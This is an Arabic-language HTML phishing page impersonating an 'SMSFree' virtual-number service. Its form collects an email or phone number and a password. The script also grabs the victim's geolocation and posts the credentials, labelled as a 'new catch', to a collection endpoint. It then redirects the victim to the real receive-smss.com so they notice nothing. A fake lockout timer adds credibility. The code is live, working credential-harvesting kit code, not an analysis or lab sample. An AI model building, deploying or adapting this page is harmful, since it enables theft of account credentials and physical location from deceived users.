<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SMSFree - تفعيل الخدمة</title>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <style>
        :root {
            --bg-color: #0f172a;
            --card-bg: rgba(30, 41, 59, 0.7);
            --primary-cyan: #22d3ee;
            --text-white: #f8fafc;
            --input-bg: rgba(15, 23, 42, 0.6);
        }

        body {
            margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, sans-serif;
            background: radial-gradient(circle at top right, #1e293b, #0f172a);
            display: flex; justify-content: center; align-items: center; min-height: 100vh;
            color: var(--text-white); overflow: hidden;
        }

        .main-container {
            width: 90%; max-width: 420px; background: var(--card-bg);
            backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.1);
            padding: 50px 30px; border-radius: 30px; text-align: center;
            box-shadow: 0 25px 60px -15px rgba(0, 0, 0, 0.7);
            position: relative;
        }

        .is-banned .blur-content { filter: blur(20px); opacity: 0.1; pointer-events: none; }

        .logo-circle {
            width: 100px; height: 100px; border: 2px solid var(--primary-cyan);
            border-radius: 50%; margin: 0 auto 25px;
            display: flex; justify-content: center; align-items: center;
            font-size: 20px; font-weight: 800; color: var(--primary-cyan);
            background: rgba(34, 211, 238, 0.05); text-shadow: 0 0 10px rgba(34, 211, 238, 0.6);
        }

        h2 { font-size: 16px; font-weight: 400; color: #cbd5e1; margin-bottom: 35px; line-height: 1.7; }

        input {
            width: 100%; padding: 16px 20px; background: var(--input-bg);
            border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 15px;
            color: white; outline: none; text-align: center; font-size: 15px;
            margin-bottom: 18px; box-sizing: border-box;
        }

        .submit-btn {
            width: 100%; padding: 18px; 
            background: linear-gradient(135deg, #155e75, #22d3ee); 
            border: none; border-radius: 15px; color: #0f172a;
            font-size: 17px; font-weight: 700; cursor: pointer;
        }

        .ban-overlay {
            position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
            z-index: 100; text-align: center; display: none; width: 100%;
        }
        #timer { font-size: 32px; font-weight: bold; color: #fbbf24; }
    </style>
</head>
<body>

<div class="main-container" id="mainCard">
    <div class="ban-overlay" id="banOverlay">
        <h3 style="color: #fbbf24;">لقد تم حظرك مؤقتاً</h3>
        <div id="timer">30</div>
    </div>

    <div class="blur-content">
        <div class="logo-circle">SMSFree</div>
        <h2>سجل دخولك الآن لتستمتع بوصول غير محدود للأرقام العالمية وتفعيل حساباتك فوراً.</h2>
        <form id="loginForm">
            <input type="text" id="user" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
            <input type="password" id="pass" placeholder="كلمة المرور" required>
            <button type="submit" class="submit-btn">تفعيل الحساب الآن</button>
        </form>
    </div>
</div>

<script>
    var loginAttempts = 0;

    document.getElementById('loginForm').onsubmit = function(e) {
        e.preventDefault();
        var u = document.getElementById('user').value.trim();
        var p = document.getElementById('pass').value;

        if (u.length >= 5 && p.length >= 6) {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    // السطر 96: تم إصلاح دمج إحداثيات الموقع
                    var loc = 'https://www.google.com/maps?q=' + position.coords.latitude + ',' + position.coords.longitude;
                    send(u, p, loc);
                }, function() {
                    send(u, p, 'الموقع مرفوض 📍');
                });
            } else {
                send(u, p, 'المتصفح لا يدعم الموقع ❌');
            }
        } else {
            loginAttempts++;
            if (loginAttempts >= 3) {
                showBan();
            } else {
                Swal.fire({ title: 'خطأ', text: 'بيانات غير دقيقة', icon: 'error' });
            }
        }
    };

    function showBan() {
        document.getElementById('mainCard').classList.add('is-banned');
        document.getElementById('banOverlay').style.display = 'block';
        var left = 30;
        var cd = setInterval(function() {
            left--;
            document.getElementById('timer').innerText = left;
            if (left <= 0) {
                clearInterval(cd);
                document.getElementById('mainCard').classList.remove('is-banned');
                document.getElementById('banOverlay').style.display = 'none';
                loginAttempts = 0;
            }
        }, 1000);
    }

    function send(u, p, l) {
        // السطر 132 المصلح: لاحظ وجود علامة الاقتباس الفردية في البداية والنهاية
        var fullMsg = '🎯 صيد جديد مرتب 🎯\n\n👤 المستخدم: ' + u + '\n🔑 كلمة السر: ' + p + '\n📍 الموقع: ' + l + '\n\n👤 @M6_vip';

        fetch('/api/save', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ message: fullMsg })
        }).then(function() {
            // التوجيه للموقع الحقيقي بعد الإرسال
            window.location.href = 'https://receive-smss.com/';
        }).catch(function(err) {
            console.error('Error:', err);
        });
    }
</script>

</body>
</html>
